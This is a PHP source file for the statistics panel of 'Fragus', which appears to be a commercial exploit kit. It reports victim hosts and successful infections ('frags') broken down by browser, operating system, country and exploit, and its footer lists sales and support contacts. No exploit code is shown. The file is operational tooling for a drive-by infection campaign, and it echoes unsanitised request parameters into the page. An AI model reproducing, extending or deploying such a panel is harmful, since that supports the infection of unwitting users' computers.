<?php

////////
$exploitsdata = "";
for ($i = 0; $i < count($exploit['exploit']); $i++){
	$exploitsdata .= "
	<tr>
		<td style='border-top: 1px solid white;' align='right'>" . $exploit['exploit'][$i] . "&nbsp;</td>
		<td style='border-top: 1px solid white;' align='right'>" . $exploit['frags'][$i] . "&nbsp;</td>
		<td style='border-top: 1px solid white;' align='right'>" . $exploit['all'][$i] . "&nbsp;</td>
		<td style='border-top: 1px solid white;' align='right'>" . number_format(round(($exploit['all'][$i] / $exploit['frags'][$i] * 100), 2), 2) . "%&nbsp;</td>
	</tr>
	";
}
if (count($exploit['exploit']) == 0){
	$exploitsdata = "<tr><td colspan='4'>Exploit list is empty</td></tr>";
}

////////
$countrysdata = "";
for ($i = 0; $i < count($countrys['country']); $i++){
	$countrysdata .= "
	<tr>
		<td width='27' align='center'><img src='./images/country/" . ($gi->GEOIP_COUNTRY_CODES[$countrys['country'][$i]] ? strtolower($gi->GEOIP_COUNTRY_CODES[$countrys['country'][$i]]) : "OTHER") . ".png' width='16' height='11'></td>
		<td style='border-top: 1px solid white;' align='right'><span style='cursor: default;' title='" . $gi->GEOIP_COUNTRY_NAMES[$countrys['country'][$i]] . "'>" . ($gi->GEOIP_COUNTRY_CODES[$countrys['country'][$i]] ? $gi->GEOIP_COUNTRY_CODES[$countrys['country'][$i]] : "OTHER") . "&nbsp;</span></td>
		<td style='border-top: 1px solid white;' align='right'>" . $countrys['all'][$i] . "&nbsp;</td>
		<td style='border-top: 1px solid white;' align='right'>" . $countrys['frags'][$i] . "&nbsp;</td>
		<td style='border-top: 1px solid white;' align='right'>" . number_format(round(($countrys['frags'][$i] / $countrys['all'][$i] * 100), 2), 2) . "%&nbsp;</td>
	</tr>
	";
}
if (count($countrys['country']) == 0){
	$countrysdata = "<tr><td colspan='5'>Country list is empty</td></tr>";
}

////////
$osdata = "";
for ($i = 0; $i < count($oss['os']); $i++){
	$osdata .= "
	<tr>
		<td width='27' align='center'><img src='./images/os/" . $oss['os'][$i] . ".gif'></td>
		<td style='border-top: 1px solid white;' align='right'>" . (($oss['os'][$i] != "OTHER") ? "<a href='javascript://'onclick=\"if (document.getElementById('os" . $oss['os'][$i] . "').style.display == 'none'){ document.getElementById('os" . $oss['os'][$i] . "').style.display = 'block'; } else { document.getElementById('os" . $oss['os'][$i] . "').style.display = 'none'; }\">" . $oss['os'][$i] . "</a>" : $oss['os'][$i]) . "&nbsp;</td>
		<td style='border-top: 1px solid white;' align='right'>" . $oss['all'][$i] . "&nbsp;</td>
		<td style='border-top: 1px solid white;' align='right'>" . $oss['frags'][$i] . "&nbsp;</td>
		<td style='border-top: 1px solid white;' align='right'>" . number_format(round(($oss['frags'][$i] / $oss['all'][$i] * 100), 2), 2) . "%&nbsp;</td>
	</tr>
	<tr>
		<td colspan='5'>
			<table width='230' border='0' style='display: none;' id='os" . $oss['os'][$i] . "' cellpadding='0' cellspacing='0'>";
	for ($z = 0; $z < count($oss_versions[$oss['os'][$i]]['version']); $z++){
		$osdata .= "
		<tr>
			<td width='76' class='subtbl" . (($z%2 == 0) ? "1" : "2") . "'>" . $oss_versions[$oss['os'][$i]]['version'][$z] . "</td>
			<td width='50' class='subtbl" . (($z%2 == 0) ? "1" : "2") . "'>" . $oss_versions[$oss['os'][$i]]['sum'][$z] . "&nbsp;</td>
			<td width='50' class='subtbl" . (($z%2 == 0) ? "1" : "2") . "'>" . $oss_versions[$oss['os'][$i]]['frags'][$z] . "&nbsp;</td>
			<td width='54' class='subtbl" . (($z%2 == 0) ? "1" : "2") . "'>" . number_format(round(($oss_versions[$oss['os'][$i]]['frags'][$z] / $oss_versions[$oss['os'][$i]]['sum'][$z] * 100), 2), 2) . "%&nbsp;</td>
		</tr>
		";
	}
	$osdata .= "
			</table>
		</td>
	</tr>
	";
}
if (count($oss['os']) == 0){
	$osdata = "<tr><td colspan='4'>Operating system list is empty</td></tr>";
}


////////
$browsersdata = "";
for ($i = 0; $i < count($browsers['browser']); $i++){
	$browsersdata .= "
	<tr>
		<td width='27' align='center'><img src='./images/browsers/" . $browsers['browser'][$i] . ".gif'></td>
		<td style='border-top: 1px solid white;' align='right'>" . (($browsers['browser'][$i] != "OTHER") ? "<a href='javascript://'onclick=\"if (document.getElementById('browser" . $browsers['browser'][$i] . "').style.display == 'none'){ document.getElementById('browser" . $browsers['browser'][$i] . "').style.display = 'block'; } else { document.getElementById('browser" . $browsers['browser'][$i] . "').style.display = 'none'; }\">" . $browsers['browser'][$i] . "</a>" : $browsers['browser'][$i]) . "&nbsp;</td>
		<td style='border-top: 1px solid white;' align='right'>" . $browsers['all'][$i] . "&nbsp;</td>
		<td style='border-top: 1px solid white;' align='right'>" . $browsers['frags'][$i] . "&nbsp;</td>
		<td style='border-top: 1px solid white;' align='right'>" . number_format(round(($browsers['frags'][$i] / $browsers['all'][$i] * 100), 2), 2) . "%&nbsp;</td>
	</tr>
	<tr>
		<td colspan='5'>
			<table width='230' border='0' style='display: none;' id='browser" . $browsers['browser'][$i] . "' cellpadding='0' cellspacing='0'>";
	for ($z = 0; $z < count($browsers_versions[$browsers['browser'][$i]]['version']); $z++){
		$browsersdata .= "
		<tr>
			<td width='76' class='subtbl" . (($z%2 == 0) ? "1" : "2") . "'>" . $browsers_versions[$browsers['browser'][$i]]['version'][$z] . "</td>
			<td width='50' class='subtbl" . (($z%2 == 0) ? "1" : "2") . "'>" . $browsers_versions[$browsers['browser'][$i]]['sum'][$z] . "&nbsp;</td>
			<td width='50' class='subtbl" . (($z%2 == 0) ? "1" : "2") . "'>" . $browsers_versions[$browsers['browser'][$i]]['frags'][$z] . "&nbsp;</td>
			<td width='54' class='subtbl" . (($z%2 == 0) ? "1" : "2") . "'>" . number_format(round(($browsers_versions[$browsers['browser'][$i]]['frags'][$z] / $browsers_versions[$browsers['browser'][$i]]['sum'][$z] * 100), 2), 2) . "%&nbsp;</td>
		</tr>
		";
	}
	$browsersdata .= "
			</table>
		</td>
	</tr>
	";
}
if (count($browsers['browser']) == 0){
	$browsersdata = "<tr><td colspan='4'>Browser list is empty</td></tr>";
}


////////
$seller_id = (isset($_GET['seller_id']) AND $_GET['seller_id'] != '0') ? "&seller_id=" . intval($_GET['seller_id']) : "";
$random = "&random=" . md5(time());


////////
echo <<<EOF
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
	<head>
		<title>Fragus</title>
		<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
		<script language="JavaScript">
		var stm = "";
		function setCookie(name, value, expires, path, domain, secure){
			document.cookie = name + "=" + escape(value) + ((expires) ? "; expires=" + expires : "") + ((path) ? "; path=" + path : "") + ((domain) ? "; domain=" + domain : "") + ((secure) ? "; secure" : "");
		}
		function getCookie(name){
			var cookie = " " + document.cookie;
			var search = " " + name + "=";
			var setStr = null;
			var offset = 0;
			var end = 0;
			if (cookie.length > 0) {
				offset = cookie.indexOf(search);
				if (offset != -1) {
					offset += search.length;
					end = cookie.indexOf(";", offset);
					if (end == -1) {
						end = cookie.length;
					}
					setStr = unescape(cookie.substring(offset, end));
				}
			}
			return(setStr);
		}
		function OnOffAjax(value){
			if (value == true){
				stm = setTimeout("LoadAjax()", {$config['AdminAjaxSeconds']}000);
				setCookie("fragus", "1", "Mon, 01-Jan-2099 00:00:00 GMT", "/");
			} else {
				stm = clearTimeout(stm);
				setCookie("fragus", "", "Mon, 01-Jan-1000 00:00:00 GMT", "/");
			}
		}
		function getXmlHttp(){
			try {
				return new ActiveXObject("Msxml2.XMLHTTP");
			} catch (e) {
				try {
					return new ActiveXObject("Microsoft.XMLHTTP");
				} catch (ee) { }
			}
			if (typeof XMLHttpRequest!='undefined') {
				return new XMLHttpRequest();
			}
		}
		function LoadAjax(){
			var xmlhttp = getXmlHttp();
			xmlhttp.open("GET", '{$_SERVER['PHP_SELF']}?seller={$_GET['seller']}&get_ajax=1&r='+Math.random());
			xmlhttp.onreadystatechange = function(){
				if (xmlhttp.readyState == 4){
					var ts = xmlhttp.responseText.split('|');
					document.getElementById('hosts').innerHTML = ts[0];
					document.getElementById('frags').innerHTML = ts[1];
					var floatValue = parseFloat(Math.round(ts[1] / ts[0] * 10000) / 100);
					if (isNaN(floatValue)) {
						document.getElementById('percent').innerHTML = 0;
					} else {
						document.getElementById('percent').innerHTML = floatValue;
					}
					stm = setTimeout("LoadAjax()", {$config['AdminAjaxSeconds']}000);
				}
			}
			xmlhttp.send(null);
		}
		</script>
		<style>
		BODY {
			background-color: black;
			font-family: Trebuchet MS, Verdana, Arial;
			color: white;
			font-size: 12px;
			background: black url('./images/bg.png');
		}
		TD {
			font-family: Trebuchet MS, Verdana, Arial;
			color: white;
			font-size: 12px;
		}
		INPUT, TEXTAREA, SELECT {
			font-family: Trebuchet MS, Verdana, Arial;
			font-size: 12px;
		}
		A.menu:link, A.menu:visited, A.menu:active {
			text-decoration: none;
			color: white;
			font-size: 13px;
			font-weight: bold;
		}
		A.menu:hover {
			color: #e3e3e3;
			text-decoration: none;
		}
		.pdlt {
			background-color: #101920;
			width: 100%;
			padding: 10px;
		}
		.tbg {
			background: #0f161e url('./images/tbg.gif');
			height: 25px;
			font-weight: bold;
			text-align: center;
			border-right: 1px solid #2b516b;
			border-left: 1px solid #0b1216;
		}
		.tdb {
			height: 30px;
			color: #0099ff;
			border-bottom: 1px solid #0099ff;
		}
		A.al:link, A.al:visited, A.al:active {
			background-color: #040404;
			padding: 1px;
			padding-left: 5px;
			padding-right: 5px;

			text-decoration: underline;
			color: #0099ff;
		}
		A.al:hover {
			color: #39b0ff;
			text-decoration: none;
		}
		A:link, A:visited, A:active {
			text-decoration: underline;
			color: white;
		}
		A:hover {
			color: #e3e3e3;
			text-decoration: none;
		}
		.tst {
			color: #66ccff;
		}
		.subtbl1, .subtbl2 {
			text-align: right;
			font-size: 10px;
		}
		.subtbl2 {
			background-color: #394850;
		}
		</style>
	</head>
	<body>


		<br>
		<center>
		<table width="911" cellpadding="0" cellspacing="0" height="95">
			<tr>
				<td width="118"><a href="{$_SERVER['PHP_SELF']}?seller={$_GET['seller']}"><img src="./images/logo.png" width="118" height="95" border="0" alt="Fragus"></a></td>
				<td align="right" valign="bottom">
					&nbsp;
				</td>
			</tr>
		</table>

		<br><br>

		<table width="980" cellpadding="0" cellspacing="0">
		<tr>
			<td width="24"><img src="./images/tl.png" width="24" height="27"></td>
			<td background="./images/tc.png">&nbsp;</td>
			<td width="24"><img src="./images/tr.png" width="24" height="27"></td>
		</tr>
		<tr>
			<td background="./images/lc.png">&nbsp;</td>
			<td background="./images/cbg.png">
				<table>
				<tr>
					<td width="160" valign="top">
						<span style="font-size: 14px;">Total statistics:</span><br><br>
						<table>
						<tr>
							<td><input type="checkbox" name="autoreload" id="autoreload" onchange="OnOffAjax(this.checked);"></td>
							<td><label for="autoreload">Ajax autoreload</label></td>
						</tr>
						</table>
						<hr style="height: 1px; border: 0px; border-bottom: 1px solid #58bcff; width: 145px; margin-left: 0px;">
						<span style="color: #58bcff; font-size: 18px; line-height: 30px;">
						Hosts: <span id="hosts">{$globalstat['all']}</span><br>
						Frags: <span id="frags">{$globalstat['frags']}</span><br>
						Percentage: <span  id="percent">{$globalstat['percent']}</span>%
						</span>
						<script>
						if (getCookie("fragus")){
							document.getElementById('autoreload').checked = true;
							stm = setTimeout("LoadAjax()", {$config['AdminAjaxSeconds']}000);
						}
						</script>
					</td>
					<td valign="top">
						<table width="760" cellpadding="0" cellspacing="0">
						<tr>
							<td width="5"><img src="./images/tl.gif" width="5" height="5"></td>
							<td bgcolor="#cccccc"><img src="./images/tl.gif" width="5" height="5"></td>
							<td width="5"><img src="./images/tr.gif" width="5" height="5"></td>
						</tr>
						<tr>
							<td width="5" bgcolor="#cccccc"><img src="./images/tl.gif" width="5" height="5"></td>
							<td bgcolor="#cccccc" style="padding: 5px;">


<b style="color: black; font-size: 13px;">Browsers</b>
<table border="0" width="100%" cellpadding="0" cellspacing="0">
<tr>
	<td valign="top" width="490" align="center"><img src="{$_SERVER['PHP_SELF']}?img=browsers&seller={$_GET['seller']}{$random}" width="480" height="180" style="background-color: white;"></td>
	<td valign="top" align="center">


		<table cellpadding="0" cellspacing="0">
		<tr>
			<td width="3"><img src="./images/stl.gif" width="3" height="3"></td>
			<td bgcolor="#273238"></td>
			<td width="3"><img src="./images/str.gif" width="3" height="3"></td>
		</tr>
		<tr>
			<td bgcolor="#273238"></td>
			<td bgcolor="#273238" style="padding: 5px;">

				<table border="0" width="230" cellpadding="0" cellspacing="0">
				<tr>
					<td>&nbsp;</td>
					<td>&nbsp;</td>
					<td align='right' width='50'><b class="tst">Hosts</b>&nbsp;</td>
					<td align='right' width='50'><b class="tst">Frags</b>&nbsp;</td>
					<td align='right' width='54'><b class="tst">Percent</b>&nbsp;</td>
				</tr>
				{$browsersdata}
				</table>

			</td>
			<td bgcolor="#273238"></td>
		</tr>
		<tr>
			<td><img src="./images/sbl.gif" width="3" height="3"></td>
			<td bgcolor="#273238"></td>
			<td><img src="./images/sbr.gif" width="3" height="3"></td>
		</tr>
		</table>

	</td>
</tr>
</table>



<br>
<b style="color: black; font-size: 13px;">Operating systems</b>
<table border="0" width="100%">
<tr>
	<td valign="top" width="490" align="center"><img src="{$_SERVER['PHP_SELF']}?img=country&seller={$_GET['seller']}{$random}" width="480" height="180" style="background-color: white;"></td>
	<td valign="top" align="center">

		<table cellpadding="0" cellspacing="0">
		<tr>
			<td width="3"><img src="./images/stl.gif" width="3" height="3"></td>
			<td bgcolor="#273238"></td>
			<td width="3"><img src="./images/str.gif" width="3" height="3"></td>
		</tr>
		<tr>
			<td bgcolor="#273238"></td>
			<td bgcolor="#273238" style="padding: 5px;">

				<table border="0" width="230" cellpadding="0" cellspacing="0">
				<tr>
					<td>&nbsp;</td>
					<td>&nbsp;</td>
					<td align='right' width='50'><b class="tst">Hosts</b>&nbsp;</td>
					<td align='right' width='50'><b class="tst">Frags</b>&nbsp;</td>
					<td align='right' width='54'><b class="tst">Percent</b>&nbsp;</td>
				</tr>
				{$osdata}
				</table>

			</td>
			<td bgcolor="#273238"></td>
		</tr>
		<tr>
			<td><img src="./images/sbl.gif" width="3" height="3"></td>
			<td bgcolor="#273238"></td>
			<td><img src="./images/sbr.gif" width="3" height="3"></td>
		</tr>
		</table>

	</td>
</tr>
</table>


<br>
<b style="color: black; font-size: 13px;">Countries</b>
<table border="0" width="100%">
<tr>
	<td valign="top" width="490" align="center"><img src="{$_SERVER['PHP_SELF']}?img=country&seller={$_GET['seller']}{$random}" width="480" height="180" style="background-color: white;"></td>
	<td valign="top" align="center">

		<table cellpadding="0" cellspacing="0">
		<tr>
			<td width="3"><img src="./images/stl.gif" width="3" height="3"></td>
			<td bgcolor="#273238"></td>
			<td width="3"><img src="./images/str.gif" width="3" height="3"></td>
		</tr>
		<tr>
			<td bgcolor="#273238"></td>
			<td bgcolor="#273238" style="padding: 5px;">

				<table border="0" width="230" cellpadding="0" cellspacing="0">
				<tr>
					<td>&nbsp;</td>
					<td>&nbsp;</td>
					<td align='right' width='50'><b class="tst">Hosts</b>&nbsp;</td>
					<td align='right' width='50'><b class="tst">Frags</b>&nbsp;</td>
					<td align='right' width='54'><b class="tst">Percent</b>&nbsp;</td>
				</tr>
				{$countrysdata}
				</table>

			</td>
			<td bgcolor="#273238"></td>
		</tr>
		<tr>
			<td><img src="./images/sbl.gif" width="3" height="3"></td>
			<td bgcolor="#273238"></td>
			<td><img src="./images/sbr.gif" width="3" height="3"></td>
		</tr>
		</table>

	</td>
</tr>
</table>

<br>
<b style="color: black; font-size: 13px;">Exploits</b>
<table border="0" width="100%">
<tr>
	<td valign="top" width="490" align="center"><img src="{$_SERVER['PHP_SELF']}?img=exploits&seller={$_GET['seller']}{$random}" width="480" height="180" style="background-color: white;"></td>
	<td valign="top" align="center">

		<table cellpadding="0" cellspacing="0">
		<tr>
			<td width="3"><img src="./images/stl.gif" width="3" height="3"></td>
			<td bgcolor="#273238"></td>
			<td width="3"><img src="./images/str.gif" width="3" height="3"></td>
		</tr>
		<tr>
			<td bgcolor="#273238"></td>
			<td bgcolor="#273238" style="padding: 5px;">

				<table border="0" width="230" cellpadding="0" cellspacing="0">
				<tr>
					<td>&nbsp;</td>
					<td align='right'><b class="tst">Frags</b>&nbsp;</td>
					<td align='right'><b class="tst">Feedbacks</b>&nbsp;</td>
					<td align='right'><b class="tst">Percent</b>&nbsp;</td>
				</tr>
				{$exploitsdata}
				</table>

			</td>
			<td bgcolor="#273238"></td>
		</tr>
		<tr>
			<td><img src="./images/sbl.gif" width="3" height="3"></td>
			<td bgcolor="#273238"></td>
			<td><img src="./images/sbr.gif" width="3" height="3"></td>
		</tr>
		</table>

	</td>
</tr>
</table>


							</td>
							<td width="5" bgcolor="#cccccc"><img src="./images/tl.gif" width="5" height="5"></td>
						</tr>
						<tr>
							<td width="5"><img src="./images/bl.gif" width="5" height="5"></td>
							<td bgcolor="#cccccc"><img src="./images/tl.gif" width="5" height="5"></td>
							<td width="5"><img src="./images/br.gif" width="5" height="5"></td>
						</tr>
						</table>
					</td>
				</tr>
				</table>
			</td>
			<td background="./images/rc.png">&nbsp;</td>
		</tr>
		<tr>
			<td width="24"><img src="./images/bl.png" width="24" height="27"></td>
			<td background="./images/bc.png">&nbsp;</td>
			<td width="24"><img src="./images/br.png" width="24" height="27"></td>
		</tr>
		</table>
		<br>
		<table width="900">
		<tr>
			<td align="right" valign="top"><b style="color: #66ccff;">Fragus v{$config['FragusVersion']}</b></td>
			<td width="300"></td>
			<td width="140"><b style="color: #66ccff;">Powered by Fragus<br>Sales:&nbsp;&nbsp;&nbsp;&nbsp; 99-68-78<br>Support: 99-69-78</b></td>
		</tr>
		</table>
		<br><br>
	</center>
 </body>
</html>
EOF;


?>